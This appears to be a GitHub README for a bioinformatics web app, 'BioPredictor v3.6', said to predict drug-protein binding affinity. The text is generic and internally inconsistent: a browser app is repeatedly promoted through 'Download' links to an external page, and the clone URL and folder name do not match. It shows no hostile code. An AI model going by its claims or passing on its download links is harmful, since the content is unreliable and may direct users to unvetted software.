# BioPredictor v3.6 - bioinformatics web app 2026

> **BioPredictor v3.6 is a browser-based bioinformatics web app for drug-protein interaction analysis, combining machine learning, binding affinity prediction, and 3D target visualization on the web.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v3.6-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/priceoliverkc4073/bio-predictor-affinity-web?style=flat-square)](https://github.com/priceoliverkc4073/bio-predictor-affinity-web)

---

<p align="center">
  <a href="https://priceoliverkc4073.github.io/bio-predictor-affinity-web/">
    <img src="https://img.shields.io/badge/Download-BioPredictor%20Latest-brightgreen?style=for-the-badge" alt="Download BioPredictor">
  </a>
</p>

> **[Direct Download - BioPredictor v3.6](https://priceoliverkc4073.github.io/bio-predictor-affinity-web/)**

---

[Download Latest Build](https://priceoliverkc4073.github.io/bio-predictor-affinity-web/)

---

## Overview

BioPredictor gives researchers and analysts a web-first way to examine drug-protein relationships. The app centers on binding affinity prediction and interaction analysis, turning molecular inputs into outputs that are useful for virtual screening and other bioinformatics tasks.

Inside one browser interface, it combines machine learning, RDKit-driven molecular handling, and accessible visualization. That makes it a practical choice when you want to inspect candidate interactions, review predictions, and present target structures without switching out of the web app.

---

## Features

- Predicts drug-protein binding affinity from molecular and target inputs
- Analyzes drug-protein and target interaction patterns
- Uses molecular fingerprints alongside amino acid composition
- Applies balanced random forest classification for prediction workflows
- Offers REST API access for integration with other tools and services
- Includes 3D target visualization for structural inspection
- Runs as a browser-based web application
- Supports virtual screening-oriented analysis pipelines

---

## Installation

Set up the project locally by cloning the repository and launching the web app in your preferred environment:

1. Download or clone the project:
   `git clone https://github.com/priceoliverkc4073/bio-predictor-affinity-web.git
2. Change into the project folder:
   `cd bio-predictor-affinity-v3-6`
3. Install the required Python and web dependencies for the Flask app and supporting libraries.
4. Start the application according to the project entry point, then open it in your browser.

If you are using a hosted build, open the download link above and launch the app from the published site.

---

## Usage

A typical session looks like this:

1. Open BioPredictor in your browser.
2. Provide the drug and target inputs required for analysis.
3. Run a binding affinity prediction.
4. Review the interaction output and model result.
5. Inspect the 3D target view for structural context.
6. Use the REST API when you need to connect the app to another pipeline or automate requests.

Example API usage pattern:

- Send a request with the relevant compound and protein data
- Receive prediction results in response
- Parse the output in your own analysis workflow

---

## Configuration

Most settings are usually handled in the Flask application layer or in the files that initialize the model and interface. If the repository provides environment variables or configuration modules, keep API-related options, runtime settings, and file paths there.

Example pattern:

    FLASK_ENV=production
    HOST=0.0.0.0
    PORT=5000

Adjust these values to match your local setup, deployment target, and preferred runtime behavior.

---

## Requirements

- Web browser for accessing the interface
- Runtime for the Flask-based application
- Python environment for model and API components
- RDKit for molecular feature handling
- Sufficient storage for project files, model assets, and supporting data
- Network access only if you are using remote hosting or API integration

---

## FAQ

**How do I get the newest version?**  
Use the latest published build from the download link above, or pull the newest repository changes if you are running locally.

**Where should I update configuration?**  
Check application configuration files, environment variables, or Flask startup settings in the project.

**Can the API be used without the browser interface?**  
Yes. The project includes REST API access for programmatic use.

**What if prediction results are missing?**  
Verify that the required dependencies are installed, confirm the input format, and review the app logs for runtime errors.

**Does the 3D view work in every browser?**  
It is intended for browser-based use, so rendering behavior depends on your browser and environment.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
